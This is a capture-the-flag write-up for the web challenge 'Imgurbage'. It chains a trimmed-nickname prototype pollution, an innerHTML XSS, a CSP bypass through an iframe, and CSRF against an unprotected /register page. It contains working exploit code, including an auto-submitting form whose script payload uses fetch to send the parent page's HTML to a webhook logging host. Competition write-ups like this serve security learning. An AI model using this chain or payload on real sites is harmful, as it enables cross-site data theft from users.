# Imgurbage (web, 4 solves)

```
Imagine Imgur, but aim MUCH LOWER, and you got Imgurbage :D
```

## Analysis
The app greets us with a basic login/register form. We have 4 form fields:
![image](https://cdn.discordapp.com/attachments/998278361132576868/1001418125633409066/unknown.png)<br>
After creating an account we can see the main image list
![image](https://cdn.discordapp.com/attachments/998278361132576868/1001418148072923146/unknown.png)

...and three buttons: to add an image, to view other user's images (providing their username and password), and...<br>
![image](https://cdn.discordapp.com/attachments/998278361132576868/1001418160257368074/unknown.png)

### POST /register (main.js)
While inspecting the file we came across this suspicious if statement in the register function:
```js
if(md5(nickname) == "1f4e0a21bb6eef87c17ca2abdfc28369") {
		return res.view("error", {message: "I know what'you're doing. So you better think again >:D"});
}
```
A quick lookup at [MD5 hash database](https://md5decrypt.net/en/) shows that the blacklisted nickname is `__proto__`, so the main idea became prototype pollution. Now we need to find out how can we exploit this.
### addFriend.js
This script is a bot, which takes our username and password, and:
* Opens new headless chrome in incognito mode
* Creates a new account with a random username and password
* Adds a post containing a flag to the new account
* goes to /combine using our credentials
* waits for 7.5s before exiting and closing the tab

If we could only smuggle an XSS there... :)
### combine.ejs
This view, given two accounts, combines their image lists into one page. Three things came to our eyes:
* A CSP is enabled, using random nonce
* A `decade` variable is created is created suspiciously. Why?
```js
let decade = window.decade ?? user.decade;
```
* Our dream XSS is here!
```js
document.getElementById("decade").innerHTML += decade;
```

By overwriting the window.decade variable using prototype pollution, we could smuggle the HTML to this page, which addFriend would display. Sounds great!
But not so fast. We have two issues now:
* We have to find a way to execute prototype pollution
* We have to bypass the CSP.

Let's go back to our nickname, and see where and how it's used.
### addFriend() (user.js)
```js
addFriend(friend) {
		if(friend instanceof User && md5(friend.nickname) != "1f4e0a21bb6eef87c17ca2abdfc28369") {
			for(let img in friend.images[friend.nickname]) {
				if(!(friend.nickname.trim() in this.images)) this.images[friend.nickname.trim()] = {};
        ...
```
That's what we needed! When the bot adds our user, the MD5 of the nickname (`__proto__`) is checked once again, but then the nickname is trimmed! Consequently, using a single space will bypass the check, and let our nickname be the starting point for the prototype pollution.
Now we need to find a way to use it. Let's examine the feature of adding images.
### /new (main.js)
```js
users[req.user.username]["images"][req.user.nickname][md5(url).slice(0,6)] = [
			url,
			description,
];
```
Bingo! Our `__proto__ ` nickname can be used there - ideally, we want this line to become `users[req.user.username]["images"]["__proto__"]["decade"]`. This way, every object would have the decade property - thus window.decade would be set to an array of `[url, description]`, which we control! (Note that in JavaScript, arrays can be automatically casted to strings, so that's not a problem)

### MD5 bruteforce
Since `decade` word has exactly 6 letters and is made only from letters valid in MD5 hash, it's possible to create a hash that starts with `decade`.
A bit of googling led us to this script, which gave us this value: `3888454`.
```py
import hashlib

target = 'decade'
candidate = 0
while True:
    plaintext = str(candidate)
    hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()
    if hash[:6] == target:
        print('plaintext:"' + plaintext + '", md5:' + hash)
        break
    candidate = candidate + 1
```
Now, adding an image with URL `3888454` and description with HTML code leads to XSS in /combine!
We still have one problem though: CSP.
### More XSS!
Now the tricky part begins. Our CSP string is `script-src 'self' 'nonce-<%- nonce %>'`, which means that we cannot directly execute the script in our XSS.
We need to find something else. Revisiting main.js, we discover another XSS vulnerability in the POST /register route:
```js
if(username in users) {
	return res.view("error", {message: "User " + username + " already exists!"});
}
```
Trying to register with already registered username will cause an XSS here, and because the error page is not protected with CSP - our payload (username) will be injected into the page as raw HTML.

### Iframe trick
Using an iframe pointing to our malicious website in the decade XSS will allow us to execute any script there, but there is one catch - we can access the parent window only if it's on the same domain as the iframe (because we want to access innerHTML of window.parent, which has the flag). We can use a trick - make the bot go to the /register page (which is on the same domain!) that has XSS vulnerability and no CSP! To achieve this, we must create an auto-submitting form with method="POST". This is only possible because the route doesn't have any Cross Site Request Forgery protection.

The idea was now to:
* Create an account with the username being our final XSS (extracting innerHTML from the iframe's parent window)
* Inject a malicious iframe to the decade XSS
* The iframe will serve a form pointing to /register with POST method
* The username input will have the value of our final XSS
* The form will automatically submit

### Preparing the iframe page
We need a simple server application to serve the malicious iframe. We can make this quickly using express.js and ngrok tunnel. Also, any service logging the requests is needed, for example [webhook.site](https://webhook.site).<br>


#### index.html
```html
<!DOCTYPE html>
<html>
    <body>
        <form method="post" action="http://localhost:8080/register">
            <input name="username" value="<script>fetch('[your-webhook-site]', {method:'post', body: window.parent.document.body.innerHTML});</script>">
            <input name="password" value="">
            <input name="nickname" value="">
            <input name="decade" value="">
        </form>
    </body>
    <script>
        setTimeout(() => {
            document.querySelector('form').submit();
        }, 500);
    </script>
</html>
```
#### index.js
```js
const express = require('express')
const app = express()

app.use((req, res, next) => {
    console.log('req');
    next();
});

app.get('/', (req, res) => {
    res.sendFile(__dirname+'/index.html');
});
app.listen(8080);
```



## Final solution
* Create first account with the username of our final XSS (to trigger an "Username is already registered" error later)
* Create second account with `__proto__ `&nbsp;nickname (don't miss the space!)
* Add the image with URL: `3888454` and description: `<iframe src="<ngrok/exploit url>">`
* Let the bot visit your (addFriend)
* Go to webhook.site (or your service of choice) and grab the flag!
* Realize it's already 4am and go to sleep 😴
